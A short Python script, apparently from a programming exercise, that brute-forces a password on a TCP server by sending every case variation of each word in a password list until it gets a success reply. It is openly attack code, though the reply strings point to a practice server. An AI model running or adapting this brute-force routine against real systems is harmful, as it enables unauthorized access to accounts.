import sys
import socket
import itertools
import os


def main():
    if len(sys.argv) != 3:
        print("Usage: python hack.py <IP> <port>")
        return

    ip = sys.argv[1]
    port = int(sys.argv[2])

    password_file = "passwords.txt"
    if not os.path.exists(password_file):
        print(f"File '{password_file}' not found.")
        return

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, port))

            with open(password_file, "r") as file:
                passwords = [line.strip() for line in file]

            for password in passwords:

                variations = map(''.join, itertools.product(*((char.lower(), char.upper()) for char in password)))

                for variant in variations:
                    s.sendall(variant.encode())

                    response = s.recv(1024).decode()

                    if response == "Connection success!":
                        print(variant)
                        return
                    elif response == "Too many attempts":
                        print("Too many attempts. Aborting.")
                        return

    except Exception as e:
        print(f"An error occurred: {e}")


if __name__ == "__main__":
    main()
